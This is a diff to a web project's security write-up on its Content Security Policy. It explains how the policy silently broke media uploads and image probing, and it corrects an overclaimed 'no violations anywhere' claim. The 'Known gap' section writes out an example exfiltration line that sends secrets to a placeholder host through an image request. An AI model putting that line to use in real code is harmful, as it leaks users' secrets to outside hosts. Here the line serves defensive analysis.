@@ -187,7 +187,46 @@ and it would pin a developer's machine to a scheme it is not serving.
 
 Verified in a browser across the public site, an article, the CMS, the settings screen, the search
 palette and the builder canvas — the last being the sharpest test, since it portals React into an
-`about:blank` iframe. **No violations anywhere.**
+`about:blank` iframe. No violations on any screen that was visited.
+
+**That sentence used to end "No violations anywhere", and it was wrong.** Every screen was walked; no
+screen *did* anything. A media upload does not travel through PHP — the browser is handed a signed URL
+and PUTs the bytes at storage itself, cross-origin — so `connect-src 'self'` blocked every upload, in
+every environment, from the day this landed. The front end reported "Could not reach storage. Is it
+running?" about a service that was running perfectly well, which is why it was read as an outage for
+as long as it was. `e2e/cross/security.spec.js` walks 23 screens and never uploads, so it agreed.
+
+The fix adds the storage origin to `connect-src` on `/cms/*` only, derived from
+`filesystems.disks.s3.url` or `.endpoint` and stripped to a bare origin — a CSP source carrying
+`/bucket` matches by path prefix. `script-src` is untouched, so the part of the policy that stops
+script executing is exactly as it was; `connect-src` governs where already-running script may send
+data. Three `OwaspTest` cases now pin it, one of them by signing a real upload and checking the policy
+permits the host that signature points at — the two that only read the policy would both still pass if
+the signed host moved. `e2e/sidebar/09-media.spec.js` performs a real upload and asserts each step.
+
+**The upload test then immediately found a second one.** `uploadMedia.js` measured the picture before
+recording it, by decoding the file from a `URL.createObjectURL` blob — and `img-src` does not permit
+`blob:`, so the policy blocked that too. It failed invisibly: the probe has an `onerror` path that
+resolves to nulls, and `store()` measures the stored bytes itself and overwrites whatever the request
+carried, so a blocked measurement and a successful one produced the same row. The probe was removed
+rather than `blob:` added to the policy — widening a security header to accommodate a value that is
+discarded on arrival is the wrong trade, and `createObjectURL` appeared exactly once in the front end.
+`MediaTest` now covers recording an upload whose request does not say how big it is.
+
+The lesson for this document: a walkthrough covers the screens it visited, and saying "anywhere" of it
+is how a gap gets recorded as a guarantee. Two defects hid behind that sentence, and the same test
+found both within a minute of existing.
+
+### Known gap: `img-src` permits any HTTPS host
+
+Found while checking the above, and not introduced by it. `img-src` is `'self' data: https:`, so script
+running on any page may set `new Image().src = 'https://somewhere-else/?' + secrets` and the policy will
+allow it. As an exfiltration channel that is far wider than the single origin added to `connect-src`,
+and tightening `connect-src` while leaving it open buys little.
+
+Not fixed here, because it needs a decision rather than an edit: article bodies and section trees can
+legitimately reference remote images, so narrowing this means either an allowlist of hosts or requiring
+every image to be in the media library. Recorded so the next reader knows it was seen and weighed.
 
 ## What holds up
 
